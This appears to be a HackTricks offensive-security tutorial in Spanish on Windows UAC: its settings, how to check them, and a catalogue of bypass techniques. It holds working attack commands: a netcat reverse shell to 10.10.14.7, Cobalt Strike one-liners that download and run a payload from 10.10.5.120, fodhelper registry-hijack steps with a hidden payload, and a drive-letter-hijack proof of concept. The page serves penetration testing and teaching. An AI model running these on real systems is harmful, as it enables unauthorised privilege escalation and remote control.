# UAC - Control de cuentas de usuario

{{#include ../../banners/hacktricks-training.md}}

## UAC

[User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) es una característica que habilita un **aviso de consentimiento para actividades elevadas**. Las aplicaciones tienen diferentes niveles de `integrity`, y un programa con un **alto nivel** puede realizar tareas que **podrían comprometer potencialmente el sistema**. Cuando UAC está habilitado, las aplicaciones y tareas siempre **se ejecutan bajo el contexto de seguridad de una cuenta no administradora** a menos que un administrador autorice explícitamente que estas aplicaciones/tareas tengan acceso a nivel de administrador para ejecutarse. Es una función de conveniencia que protege a los administradores de cambios no intencionados, pero no se considera un límite de seguridad.

Para más información sobre los niveles de integridad:


{{#ref}}
../windows-local-privilege-escalation/integrity-levels.md
{{#endref}}

Cuando UAC está activo, a un usuario administrador se le asignan 2 tokens: uno de usuario estándar, para realizar acciones regulares a nivel normal, y otro con los privilegios de administrador.

Esta [page](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) explica en profundidad cómo funciona UAC e incluye el proceso de inicio de sesión, la experiencia del usuario y la arquitectura de UAC. Los administradores pueden usar políticas de seguridad para configurar cómo funciona UAC específico para su organización a nivel local (usando secpol.msc), o configurarlo y desplegarlo mediante Group Policy Objects (GPO) en un entorno de dominio Active Directory. Las distintas opciones se describen en detalle [here](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings). Hay 10 configuraciones de Group Policy que pueden establecerse para UAC. La siguiente tabla proporciona detalles adicionales:

| Group Policy Setting                                                                                                                                                                                                                                                                                                                                                           | Registry Key                | Default Setting                                              |
| ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | --------------------------- | ------------------------------------------------------------ |
| [User Account Control: Admin Approval Mode for the built-in Administrator account](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-admin-approval-mode-for-the-built-in-administrator-account)                                                     | FilterAdministratorToken    | Deshabilitado                                                |
| [User Account Control: Allow UIAccess applications to prompt for elevation without using the secure desktop](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-allow-uiaccess-applications-to-prompt-for-elevation-without-using-the-secure-desktop) | EnableUIADesktopToggle      | Deshabilitado                                                |
| [User Account Control: Behavior of the elevation prompt for administrators in Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-behavior-of-the-elevation-prompt-for-administrators-in-admin-approval-mode)                     | ConsentPromptBehaviorAdmin  | Solicitar consentimiento para binarios que no son de Windows |
| [User Account Control: Behavior of the elevation prompt for standard users](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-behavior-of-the-elevation-prompt-for-standard-users)                                                                   | ConsentPromptBehaviorUser   | Solicitar credenciales en el secure desktop                  |
| [User Account Control: Detect application installations and prompt for elevation](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-detect-application-installations-and-prompt-for-elevation)                                                       | EnableInstallerDetection    | Habilitado (predeterminado para Home) Deshabilitado (predeterminado para Enterprise) |
| [User Account Control: Only elevate executables that are signed and validated](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-only-elevate-executables-that-are-signed-and-validated)                                                             | ValidateAdminCodeSignatures | Deshabilitado                                                |
| [User Account Control: Only elevate UIAccess applications that are installed in secure locations](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-only-elevate-uiaccess-applications-that-are-installed-in-secure-locations)                       | EnableSecureUIAPaths        | Habilitado                                                   |
| [User Account Control: Run all administrators in Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-run-all-administrators-in-admin-approval-mode)                                                                               | EnableLUA                   | Habilitado                                                   |
| [User Account Control: Switch to the secure desktop when prompting for elevation](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-switch-to-the-secure-desktop-when-prompting-for-elevation)                                                       | PromptOnSecureDesktop       | Habilitado                                                   |
| [User Account Control: Virtualize file and registry write failures to per-user locations](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-virtualize-file-and-registry-write-failures-to-per-user-locations)                                       | EnableVirtualization        | Habilitado                                                   |

### UAC Bypass Theory

Algunos programas se **autoelevan automáticamente** si el **usuario pertenece** al **grupo de administradores**. Estos binarios tienen dentro de sus _**Manifests**_ la opción _**autoElevate**_ con valor _**True**_. El binario además debe estar **firmado por Microsoft**.

Muchos procesos auto-elevados exponen **funcionalidad vía objetos COM o servidores RPC**, que pueden invocarse desde procesos que se ejecutan con integridad media (privilegios a nivel de usuario regular). Nota que COM (Component Object Model) y RPC (Remote Procedure Call) son métodos que los programas de Windows usan para comunicarse y ejecutar funciones entre procesos. Por ejemplo, **`IFileOperation COM object`** está diseñado para manejar operaciones de archivo (copiar, eliminar, mover) y puede elevar privilegios automáticamente sin un aviso.

Hay que tener en cuenta que se pueden realizar algunas comprobaciones, como verificar si el proceso se ejecutó desde el **directorio System32**, lo cual puede evitarse por ejemplo **inyectando en explorer.exe** u otro ejecutable ubicado en System32.

Otra forma de eludir estas comprobaciones es **modificar el PEB**. Cada proceso en Windows tiene un Process Environment Block (PEB), que incluye datos importantes sobre el proceso, como la ruta de su ejecutable. Al modificar el PEB, los atacantes pueden falsificar (spoofear) la ubicación de su propio proceso malicioso, haciéndolo parecer que se ejecuta desde un directorio de confianza (como system32). Esta información falsificada engaña al objeto COM para autoelevar privilegios sin solicitar consentimiento.

Entonces, para **bypassear** el **UAC** (elevar desde nivel de integridad **medio** a **alto**) algunos atacantes usan este tipo de binarios para **ejecutar código arbitrario** porque será ejecutado desde un **proceso con integridad de nivel alto**.

Puedes **comprobar** el _**Manifest**_ de un binario usando la herramienta _**sigcheck.exe**_ de Sysinternals. (`sigcheck.exe -m <file>`) Y puedes **ver** el **nivel de integridad** de los procesos usando _Process Explorer_ o _Process Monitor_ (de Sysinternals).

### Comprobar UAC

Para confirmar si UAC está habilitado, haga:
```
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA

HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
EnableLUA    REG_DWORD    0x1
```
Si es **`1`** entonces UAC está **activado**, si es **`0`** o no existe, entonces UAC está **inactivo**.

Luego, comprueba **qué nivel** está configurado:
```
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin

HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
ConsentPromptBehaviorAdmin    REG_DWORD    0x5
```
- Si **`0`**, entonces UAC no pedirá confirmación (como **deshabilitado**)
- Si **`1`** al administrador se le **pide nombre de usuario y contraseña** para ejecutar el binario con privilegios elevados (en Secure Desktop)
- Si **`2`** (**Always notify me**) UAC siempre pedirá confirmación al administrador cuando intente ejecutar algo con privilegios altos (en Secure Desktop)
- Si **`3`** como `1` pero no es necesario en Secure Desktop
- Si **`4`** como `2` pero no es necesario en Secure Desktop
- si **`5`**(**default**) pedirá al administrador confirmar para ejecutar binarios no Windows con privilegios elevados

Then, you have to take a look at the value of **`LocalAccountTokenFilterPolicy`**\
If the value is **`0`**, then, only the **RID 500** user (**Administrador integrado**) is able to perform **admin tasks without UAC**, and if its `1`, **all accounts inside "Administrators"** group can do them.

And, finally take a look at the value of the key **`FilterAdministratorToken`**\
If **`0`**(default), the **la cuenta de Administrador integrado puede** do remote administration tasks and if **`1`** la cuenta de Administrador integrado **cannot** do remote administration tasks, unless `LocalAccountTokenFilterPolicy` is set to `1`.

#### Resumen

- Si `EnableLUA=0` o **no existe**, **no hay UAC para nadie**
- Si `EnableLua=1` y **`LocalAccountTokenFilterPolicy=1`, no hay UAC para nadie**
- Si `EnableLua=1` y **`LocalAccountTokenFilterPolicy=0` y `FilterAdministratorToken=0`, no hay UAC para RID 500 (Administrador integrado)**
- Si `EnableLua=1` y **`LocalAccountTokenFilterPolicy=0` y `FilterAdministratorToken=1`, UAC para todos**

All this information can be gathered using the **metasploit** module: `post/windows/gather/win_privs`

You can also check the groups of your user and get the integrity level:
```
net user %username%
whoami /groups | findstr Level
```
## UAC bypass

> [!TIP]
> Ten en cuenta que si tienes acceso gráfico a la víctima, el bypass de UAC es sencillo, ya que simplemente puedes hacer clic en "Sí" cuando aparezca el aviso de UAC

El bypass de UAC es necesario en la siguiente situación: **UAC está activado, tu proceso se está ejecutando en un contexto de integridad media, y tu usuario pertenece al grupo Administrators**.

Es importante mencionar que es **mucho más difícil hacer bypass al UAC si está en el nivel de seguridad más alto (Always) que si está en cualquiera de los otros niveles (Default).**

### UAC deshabilitado

If UAC is already disabled (`ConsentPromptBehaviorAdmin` is **`0`**) you can **execute a reverse shell with admin privileges** (high integrity level) using something like:
```bash
#Put your reverse shell instead of "calc.exe"
Start-Process powershell -Verb runAs "calc.exe"
Start-Process powershell -Verb runAs "C:\Windows\Temp\nc.exe -e powershell 10.10.14.7 4444"
```
#### UAC bypass with token duplication

- [https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/](https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/)
- [https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html](https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html)

### **Muy** básico UAC "bypass" (acceso completo al sistema de archivos)

Si tienes una shell con un usuario que está dentro del grupo Administrators puedes **montar el recurso compartido C$** vía SMB (sistema de archivos) como un nuevo disco local y tendrás **acceso a todo dentro del sistema de archivos** (incluso la carpeta de inicio de Administrator).

> [!WARNING]
> **Parece que este truco ya no funciona**
```bash
net use Z: \\127.0.0.1\c$
cd C$

#Or you could just access it:
dir \\127.0.0.1\c$\Users\Administrator\Desktop
```
### UAC bypass con cobalt strike

Las técnicas de Cobalt Strike solo funcionarán si UAC no está configurado en su nivel máximo de seguridad
```bash
# UAC bypass via token duplication
elevate uac-token-duplication [listener_name]
# UAC bypass via service
elevate svc-exe [listener_name]

# Bypass UAC with Token Duplication
runasadmin uac-token-duplication powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
# Bypass UAC with CMSTPLUA COM interface
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
```
**Empire** y **Metasploit** también tienen varios módulos para **bypass** la **UAC**.

### KRBUACBypass

Documentación y herramienta en [https://github.com/wh0amitz/KRBUACBypass](https://github.com/wh0amitz/KRBUACBypass)

### UAC bypass exploits

[**UACME** ](https://github.com/hfiref0x/UACME) que es una **compilación** de varios UAC bypass exploits. Ten en cuenta que necesitarás **compilar UACME usando Visual Studio o msbuild**. La compilación creará varios ejecutables (como `Source\Akagi\outout\x64\Debug\Akagi.exe`), deberás saber **cuál necesitas.**\ Debes **tener cuidado** porque algunos bypasses harán que **otros programas muestren avisos** que **alertarán** al **usuario** de que algo está ocurriendo.

UACME incluye la **versión de build desde la cual cada técnica empezó a funcionar**. Puedes buscar una técnica que afecte tus versiones:
```
PS C:\> [environment]::OSVersion.Version

Major  Minor  Build  Revision
-----  -----  -----  --------
10     0      14393  0
```
Además, usando [this](https://en.wikipedia.org/wiki/Windows_10_version_history) page obtienes la versión de Windows `1607` a partir de los números de build.

### UAC Bypass – fodhelper.exe (Registry hijack)

El binario de confianza `fodhelper.exe` se eleva automáticamente en Windows moderno. Al iniciarse, consulta la ruta del registro por usuario que aparece a continuación sin validar el verbo `DelegateExecute`. Plantar un comando allí permite que un proceso Medium Integrity (el usuario está en Administradores) genere un proceso High Integrity sin solicitar un UAC prompt.

Ruta del registro consultada por fodhelper:
```
HKCU\Software\Classes\ms-settings\Shell\Open\command
```
Pasos de PowerShell (configura tu payload, luego ejecútalo):
```powershell
# Optional: from a 32-bit shell on 64-bit Windows, spawn a 64-bit PowerShell for stability
C:\\Windows\\sysnative\\WindowsPowerShell\\v1.0\\powershell -nop -w hidden -c "$PSVersionTable.PSEdition"

# 1) Create the vulnerable key and values
New-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force | Out-Null

# 2) Set default command to your payload (example: reverse shell or cmd)
# Replace <BASE64_PS> with your base64-encoded PowerShell (or any command)
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -e <BASE64_PS>" -Force

# 3) Trigger auto-elevation
Start-Process -FilePath "C:\\Windows\\System32\\fodhelper.exe"

# 4) (Recommended) Cleanup
Remove-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open" -Recurse -Force
```
Notas:
- Funciona cuando el usuario actual es miembro de Administrators y el nivel de UAC es default/lenient (no Always Notify con restricciones extra).
- Usa la ruta `sysnative` para iniciar un PowerShell de 64-bit desde un proceso de 32-bit en Windows de 64-bit.
- La payload puede ser cualquier comando (PowerShell, cmd, o la ruta de un EXE). Evita UIs que pidan interacción para mantener sigilo.

#### Más UAC bypass

**Todas** las técnicas usadas aquí para bypass AUC **requieren** una **shell interactiva completa** con la víctima (una shell común de nc.exe no es suficiente).

Puedes obtenerla usando una sesión **meterpreter**. Migra a un **proceso** que tenga el valor **Session** igual a **1**:

![](<../../images/image (863).png>)

(_explorer.exe_ debería funcionar)

### UAC Bypass con GUI

Si tienes acceso a una **GUI puedes simplemente aceptar el UAC prompt** cuando lo recibas, realmente no necesitas un bypass. Por lo tanto, obtener acceso a una GUI te permitirá bypassear el UAC.

Además, si obtienes una sesión GUI que alguien estaba usando (potencialmente vía RDP) hay **algunas herramientas que estarán ejecutándose como administrator** desde donde podrías **ejecutar** un **cmd**, por ejemplo, **como admin** directamente sin que UAC vuelva a pedir permiso, como [**https://github.com/oski02/UAC-GUI-Bypass-appverif**](https://github.com/oski02/UAC-GUI-Bypass-appverif). Esto podría ser un poco más **sigiloso**.

### Noisy brute-force UAC bypass

Si no te importa ser ruidoso, siempre podrías **ejecutar algo como** [**https://github.com/Chainski/ForceAdmin**](https://github.com/Chainski/ForceAdmin) que **solicita elevar permisos hasta que el usuario lo acepte**.

### Tu propio bypass - Metodología básica de UAC bypass

Si echas un vistazo a **UACME** notarás que **la mayoría de los UAC bypasses abusa de una vulnerabilidad de Dll Hijacking** (principalmente escribiendo el dll malicioso en _C:\Windows\System32_). [Lee esto para aprender cómo encontrar una vulnerabilidad de Dll Hijacking](../windows-local-privilege-escalation/dll-hijacking/index.html).

1. Encuentra un binary que **autoelevate** (comprueba que cuando se ejecuta corre en un nivel de integridad alto).
2. Con procmon busca eventos "**NAME NOT FOUND**" que puedan ser vulnerables a **DLL Hijacking**.
3. Probablemente necesitarás **escribir** el DLL dentro de algunos **protected paths** (como C:\Windows\System32) donde no tienes permisos de escritura. Puedes bypassear esto usando:
1. **wusa.exe**: Windows 7,8 y 8.1. Permite extraer el contenido de un CAB dentro de rutas protegidas (porque esta herramienta se ejecuta desde un nivel de integridad alto).
2. **IFileOperation**: Windows 10.
4. Prepara un **script** para copiar tu DLL dentro de la ruta protegida y ejecutar el binary vulnerable y autoelevado.

### Otra técnica de UAC bypass

Consiste en vigilar si un **autoElevated binary** intenta **leer** del **registry** el **name/path** de un **binary** o **command** que vaya a ser **executed** (esto es más interesante si el binary busca esta información dentro de **HKCU**).

### Administrator Protection (25H2) drive-letter hijack via per-logon-session DOS device map

Windows 11 25H2 “Administrator Protection” usa shadow-admin tokens con mapas por sesión `\Sessions\0\DosDevices/<LUID>`. El directorio se crea de forma perezosa por `SeGetTokenDeviceMap` en la primera resolución de `\??`. Si el atacante se hace pasar por el shadow-admin token solo en **SecurityIdentification**, el directorio se crea con el atacante como **owner** (hereda `CREATOR OWNER`), permitiendo enlaces de drive-letter que tienen precedencia sobre `\GLOBAL??`.

**Pasos:**

1. Desde una sesión con pocos privilegios, llama a `RAiProcessRunOnce` para spawnear un `runonce.exe` shadow-admin sin prompt.
2. Duplica su primary token a un token de **identification** e impersonalo mientras abres `\??` para forzar la creación de `\Sessions\0\DosDevices/<LUID>` bajo la propiedad del atacante.
3. Crea un symlink `C:` allí apuntando a almacenamiento controlado por el atacante; los accesos posteriores al filesystem en esa sesión resuelven `C:` a la ruta del atacante, habilitando DLL/file hijack sin prompt.

**PowerShell PoC (NtObjectManager):**
```powershell
$pid = Invoke-RAiProcessRunOnce
$p = Get-Process -Id $pid
$t = Get-NtToken -Process $p
$id = New-NtTokenDuplicate -Token $t -ImpersonationLevel Identification
Invoke-NtToken $id -ImpersonationLevel Identification { Get-NtDirectory "\??" | Out-Null }
$auth = Get-NtTokenId -Authentication -Token $id
New-NtSymbolicLink "\Sessions\0\DosDevices/$auth/C:" "\??\\C:\\Users\\attacker\\loot"
```
## Referencias
- [HTB: Rainbow – SEH overflow to RCE over HTTP (0xdf) – fodhelper UAC bypass steps](https://0xdf.gitlab.io/2025/08/07/htb-rainbow.html)
- [LOLBAS: Fodhelper.exe](https://lolbas-project.github.io/lolbas/Binaries/Fodhelper/)
- [Microsoft Docs – How User Account Control works](https://learn.microsoft.com/windows/security/identity-protection/user-account-control/how-user-account-control-works)
- [UACME – UAC bypass techniques collection](https://github.com/hfiref0x/UACME)
- [Project Zero – Windows Administrator Protection drive-letter hijack](https://projectzero.google/2026/26/windows-administrator-protection.html)

{{#include ../../banners/hacktricks-training.md}}
